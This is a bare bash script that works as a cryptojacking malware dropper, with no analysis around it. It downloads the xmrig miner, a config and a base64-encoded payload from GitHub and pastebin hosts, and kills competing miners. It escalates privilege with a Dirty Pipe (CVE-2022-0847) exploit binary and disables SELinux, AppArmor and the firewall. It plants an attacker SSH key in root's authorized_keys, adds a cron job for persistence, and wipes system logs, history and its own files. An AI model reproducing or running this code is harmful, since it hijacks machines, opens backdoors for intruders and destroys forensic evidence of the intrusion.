#!/bin/bash

uid=$(id -u)
coo2=$(ps -ef | grep coo2 | grep -v grep | wc -l)
xm="https://github.com/evww4x/tar11/releases/download/tar/xmrig.tar.gz"
config_u="https://pastebin.com/raw/kipdCbBx"
file="https://github.com/evww4x/tar11/releases/download/tar/ta.tar.gz"
coo="https://github.com/evww4x/tar11/releases/download/tar/coo2.tar.gz"
ccc="https://raw.githubusercontent.com/evww4x/ffileA/main/ccc.txt"

Kill(){
    pkill -f biosetjenkins 
    pkill -f AnXqV.yam
    pkill -f xmrigDaemon
    pkill -f xmrigMiner
    pkill -f xmrig
    pkill -f Loopback
    pkill -f apaceha
    pkill -f cryptonight
    pkill -f sourplum
    pkill -f wnTKYg
    pkill -f ddg*
    pkill -f stratum
    pkill -f mixnerdx
    pkill -f performedl
    pkill -f JnKihGjn
    pkill -f irqba2anc1
    pkill -f irqba5xnc1
    pkill -f irqbnc1
    pkill -f irqbalance
    pkill -f crypto-pool
    pkill -f minexmr
    pkill -f XJnRj
    pkill -f NXLAi
    pkill -f BI5zj
    pkill -f askdljlqw
    pkill -f minerd #1
    pkill -f ir29xc1
    pkill -f minergate
    pkill -f Guard.sh
    pkill -f ysaydh
    pkill -f bonns
    pkill -f donns
    pkill -f kxjd
    pkill -f Duck.sh
    pkill -f bonn.sh #2
    pkill -f conns
    pkill -f conn.sh
    pkill -f kworker34
    pkill -f kw.sh
    pkill -f pro.sh
    pkill -f polkitd
    pkill -f acpid
    pkill -f icb5o
    pkill -f nopxi
    pkill -f irqbalanc1
    pkill -f minerd
    pkill -f i586
    pkill -f gddr
    pkill -f mstxmr
    pkill -f ddg.2011
    pkill -f wnTKYg
    pkill -f deamon
    pkill -f bashf
    pkill -f bashh
    pkill -f XbashY
    pkill -f libapache
    pkill -f qW3xT.2
    pkill -f disk_genius
    pkill -f sourplum
    pkill -f bashx
    pkill -f sustes
    pkill -f Xbash
    pkill -f bashg
    pkill -f bashe
    ps auxf|grep -v grep|grep "hashfish" | awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "cranbery" | awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "stratum" | awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmr" | awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "minerd" | awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep -v "\_" |grep -v "kthreadd" |grep "\[.*\]"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmrig" | awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmrigDaemon" | awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmrigMiner" | awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xig" | awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "ddgs" | awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "qW3xT" | awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "t00ls.ru" | awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "/var/tmp/sustes" | awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "sustes" | awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "Xbash" | awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep /tmp/thisxxs|awk '{print $2}'|xargs kill  
    ps auxf|grep -v grep|grep /opt/yilu/work/xig/xig|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep /opt/yilu/mservice|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep /usr/bin/.sshd|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|rep /usr/bin/bsd-port/getty | awk '{print $2}'|xargs kill -9
    rm -rf /var/tmp/j*
    rm -rf /tmp/j*
    rm -rf /var/tmp/java
    rm -rf /tmp/java
    rm -rf /var/tmp/java2
    rm -rf /tmp/java2
    rm -rf /var/tmp/java*
    rm -rf /tmp/java*
    rm -rf /tmp/httpd.conf
    rm -rf /var/spool/cron/*
}
kill



Downloads(){
    if  [ ! -f "/tmp/xmrig" ];then
        (curl -fsSL --connect-timeout 120 $xm -o /tmp/xmrig.tar.gz||wget $xm -O /tmp/xmrig.tar.gz)&& tar -zxf /tmp/xmrig.tar.gz -C /tmp/&& chmod +x /tmp/xmrig
    else
        rm /tmp/xmrig
        (curl -fsSL --connect-timeout 120 $xm -o /tmp/xmrig.tar.gz||wget $xm -O /tmp/xmrig.tar.gz)&& tar -zxf /tmp/xmrig.tar.gz -C /tmp/&& chmod +x /tmp/xmrig
    fi
    if  [ ! -f "/tmp/config.json" ];then
        (curl -fsSL --connect-timeout 120 $config_u -o /tmp/config.json||wget $config_u -O /tmp/config.json)&& chmod +x /tmp/config.json
    else
        rm /tmp/config.json
        (curl -fsSL --connect-timeout 120 $config_u -o /tmp/config.json||wget $config_u -O /tmp/config.json)&& chmod +x /tmp/config.json
    fi
    if  [ ! -f "/tmp/ta.tar.gz" ];then
        (curl -fsSL --connect-timeout 120 $file -o /tmp/ta.tar.gz||wget $file -O /tmp/ta.tar.gz)&& tar -zxf /tmp/ta.tar.gz -C /tmp/&& chmod +x /tmp/cve_2022_0847
    fi
    if  [ ! -f "/tmp/coo2.tar.gz" ] || [ ! -f "/tmp/coo2" ];then
        (curl -fsSL --connect-timeout 120 $coo -o /tmp/coo2.tar.gz||wget $coo -O /tmp/coo2.tar.gz)&& tar -zxf /tmp/coo2.tar.gz -C /tmp/&& chmod +x /tmp/coo2
    fi
    if  [ ! -f "/tmp/ccc.sh" ];then
        (curl -fsSL --connect-timeout 120 $ccc -o /tmp/ccc.txt||wget $ccc -O /tmp/ccc.txt)&& base64 -d /tmp/ccc.txt > /tmp/ccc.sh&& chmod +x /tmp/ccc.sh 
    fi
}
Downloads

mkdir -p /tmp/.cro/
mv /tmp/ccc.sh /tmp/.cro/

clear_log(){
    echo > /var/log/syslog
    echo > /var/log/messages
    echo > /var/log/httpd/access_log
    echo > /var/log/httpd/error_log
    echo > /var/log/xferlog
    echo > /var/log/secure
    echo > /var/log/auth.log
    echo > /var/log/user.log
    echo > /var/log/wtmp
    echo > /var/log/lastlog
    echo > /var/log/btmp
    echo > /var/run/utmp
    rm ~/./bash_history
}

cve-2022-0847(){
    version1="5.16.11"
    version2="5.15.25"
    version3="5.10.102"

current_version="$(uname -r | cut -d '-' -f 1)"
if [[ "$(echo "$current_version" | cut -d '.' -f 1)" -eq 5 && "$(echo "$current_version" | cut -d '.' -f 2)" -ge 8 && "$current_version" < "$version1" && "$current_version" < "$version2" && "$current_version" < "$version3" ]]; then
    /tmp/cve_2022_0847 /bin/su <<EOF
    ulimit -n 65535
    sync && echo 3 >/proc/sys/vm/drop_caches
    iptables -F
    echo SELINUX=disabled >/etc/selinux/config
    service apparmor stop
    systemctl disable apparmor
    echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf
    sysctl kernel.nmi_watchdog=0
    chattr -i /root/.ssh/authorized_keys
    chmod 700 /root/.ssh/
    chmod 600 /root/.ssh/authorized_keys
    echo -e "\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDGGd/kxTgrj0Z7QKRCWkbOujTK3DZStMzfatHh92587L0h1bVgHZrHTDzYlyj+xbj/OMM3pbWsmL1fEZ4oeerypOL9h6C63sJeuXtSCsMPVrV+QyVYVkmQmKlr0L4H7+ftrs+xR5Me+t/8FcsXNQvjqAWNiDjyvjs8LdisPwEcftbQ9k7O+iXZkjjJw1eEnmHr75OCMiCC/03YkPcw4dOzu7byJ4nxGroPsdHctiwxii8t4+x0CpEW3PCTWjOKkaEYEU2eycgQe0ixJYvGMOviJ9y0iJmaBy8N8SabKnBN/sus7Xcv6cpik1JxSCTc43eq0+IuylfyzV+/sX1b2irgd1+rZnCz8Y+JpbpQlblLp+7IiMIelETr4dMUaWDcp5kN5v5q9Za3UedI2ijWnchlWAnYuY2JmeKRCGwWvdfSYSgbhvlrCJI1VUfFVhZdgPZzzqdqgdDiT7Dxcq/7CBPQwzU33fWqgmQXuOBYftjzWDxcCIjruR6HvVQqLf9h88M= FalankeXION\n" >> /root/.ssh/authorized_keys
    chattr +i /root/.ssh/authorized_keys
    cd /tmp/
    echo "*/5 * * * * root bash /tmp/.cro/ccc.sh >/dev/null 2>&1" >> /etc/crontab
    mkdir -p /etc/.Acr
    mv /tmp/xmrig /tmp/config.json  /etc/.Acr
    cd /etc/.Acr/
    chattr +i config.json
    nohup ./xmrig > /dev/null 2>&1 &
    echo > /var/log/syslog
    echo > /var/log/messages
    echo > /var/log/httpd/access_log
    echo > /var/log/httpd/error_log
    echo > /var/log/xferlog
    echo > /var/log/secure
    echo > /var/log/auth.log
    echo > /var/log/user.log
    echo > /var/log/wtmp
    echo > /var/log/lastlog
    echo > /var/log/btmp
    echo > /var/run/utmp
    rm ~/./bash_history
EOF
    return 0
    fi
}


run(){
if [ "$uid" = '0' ];then
    ulimit -n 65535
    sync && echo 3 >/proc/sys/vm/drop_caches
    iptables -F
    echo SELINUX=disabled >/etc/selinux/config
    service apparmor stop
    systemctl disable apparmor
    echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf
    sysctl kernel.nmi_watchdog=0
    echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf
    chattr -i /root/.ssh/authorized_keys
    chmod 700 /root/.ssh/
    chmod 600 /root/.ssh/authorized_keys
    echo -e "\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDGGd/kxTgrj0Z7QKRCWkbOujTK3DZStMzfatHh92587L0h1bVgHZrHTDzYlyj+xbj/OMM3pbWsmL1fEZ4oeerypOL9h6C63sJeuXtSCsMPVrV+QyVYVkmQmKlr0L4H7+ftrs+xR5Me+t/8FcsXNQvjqAWNiDjyvjs8LdisPwEcftbQ9k7O+iXZkjjJw1eEnmHr75OCMiCC/03YkPcw4dOzu7byJ4nxGroPsdHctiwxii8t4+x0CpEW3PCTWjOKkaEYEU2eycgQe0ixJYvGMOviJ9y0iJmaBy8N8SabKnBN/sus7Xcv6cpik1JxSCTc43eq0+IuylfyzV+/sX1b2irgd1+rZnCz8Y+JpbpQlblLp+7IiMIelETr4dMUaWDcp5kN5v5q9Za3UedI2ijWnchlWAnYuY2JmeKRCGwWvdfSYSgbhvlrCJI1VUfFVhZdgPZzzqdqgdDiT7Dxcq/7CBPQwzU33fWqgmQXuOBYftjzWDxcCIjruR6HvVQqLf9h88M= FalankeXION\n" >> /root/.ssh/authorized_keys
    chattr +i /root/.ssh/authorized_keys
    cd /tmp/
    echo "*/5 * * * * root bash /tmp/.cro/ccc.sh >/dev/null 2>&1" >> /etc/crontab
    mkdir -p /etc/.Acr
    mv /tmp/xmrig /tmp/config.json  /etc/.Acr
    cd /etc/.Acr/
    chattr +i config.json
    nohup ./xmrig > /dev/null 2>&1 &
    clear_log
else
    cve-2022-0847
    if [ $? -eq 0 ]; then
        return
    fi
    cd /tmp
    if [ "$coo2" -eq 0 ]; then
        nohup ./coo2 > /dev/null 2>&1 &
    fi
    nohup ./xmrig > /dev/null 2>&1 &
    shred -u /tmp/.cro/ccc.sh
fi
}
run

shred -u /tmp/ccc.txt
shred -u /tmp/xmrig.tar.gz
shred -u /tmp/ta.tar.gz
shred -u /tmp/cve_2022_0847
history -c
